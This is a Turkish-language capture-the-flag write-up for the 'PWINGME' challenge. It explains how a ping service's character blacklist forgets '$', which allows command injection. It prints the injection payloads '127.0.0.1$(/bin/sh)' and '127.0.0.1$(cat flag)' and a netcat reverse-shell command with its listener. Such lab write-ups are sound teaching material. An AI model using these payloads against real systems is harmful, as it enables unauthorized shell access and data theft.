## Soru İsmi: PWINGME

## Soru Metni:

```nc 192.168.$MASANO.5 7777```

## On bilgi:
Kendi ortaminizda dosyayi binary dosyasini 7777 portundan servis etmek icin asagidaki komutu kullanabilirsiniz. Ancak unutmayin ki, sorunun calistigi isletim sistemi ile sizin isletim sisteminiz farkli oldugu icin, yarisma platformu tam olarak simule edilemeyecektir. Ayni klasorde flag isimli dosya icerisinde flag yer almaktadir.

```socat TCP-LISTEN:7777,reuseaddr,fork EXEC:"./pwingme"```



## Çözüm: 

1. Soru metnine gore  “; & $ > < ` \ !” karakterleri girdi olarak alindiginda karaliste anlasilmaktadir. Ancak $ karakterini denedigimizde karalisteye alinmadigi, unutuldugu fark edilmektedir. Linux isletim sistemlerinde $(komut) command injection saldirilarinda kullanilmaktadir.

Yukaridaki bilgi bilinmese dahi ipuclarindan yer alan cumle (“The following special character can be used for command injection such as |  ; & $ > < ` \ !”) arama motorlarinda aratildigi zaman OWASP* sitesindeki yazi bulunmaktadir. 
* https://www.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)

![Preview](https://github.com/stmctf/stmctf17/blob/master/PWN/PWINGME/p1.png)

2. Bu yazida yer alan ornek kullanimlari mevcut olan $(cmd) komutunun calistigi fark edilmektedir (ornegin ; karakteri kullanildiginda “ILLEGAL CHAR: ;” hatasi vermektedir ancak $ karakteri kullanildiginda baska bir hata donmektedir).

![Preview](https://github.com/stmctf/stmctf17/blob/master/PWN/PWINGME/p2.png)


3. Ancak bu sorudaki puf nokta STDOUT’un ekrana bastirilmamasidir. Bu durumun fark edilerek ```127.0.0.1$(/bin/sh)``` komutu ile blind shell alinmalidir. Devaminda ise reverse shell acilarak kendi bilgisayarimiza shell gonderilmelidir. Reverse shell almak icin ```nc -e /bin/sh $KENDIIPADRESIMIZ 4444``` komutu kullanilabilir.

4. Kendi bilgisayarimizdan ```nc -lnvp 4444``` ile dinledigimiz ve reverse shell’i tetikledigimiz durumda, soru sunucusundan shell alinmaktadir.

![Preview](https://github.com/stmctf/stmctf17/blob/master/PWN/PWINGME/p3.png)



Alternatif Cozum Yolu:

1. Shell almaya gerek kalmadan, soru binary dosyasi ile ayni dizinde flag dosyasi oldugu dusunulerek, ```127.0.0.1$(cat flag)``` komutu ile flag ekrana bastirilabilmektedir. Boylelikle calistirilan komut ```“PING 127.0.0.1”+(cat flag komutunun ciktisi yani flag degeri)``` olacaktir. STDERR ekrana bastirildigi icin ve ```PING 127.0.0.1STMCTF{...}``` komutu hata dondureceginden dolayi flag ekrana bastirilacaktir.

![Preview](https://github.com/stmctf/stmctf17/blob/master/PWN/PWINGME/p4.png)

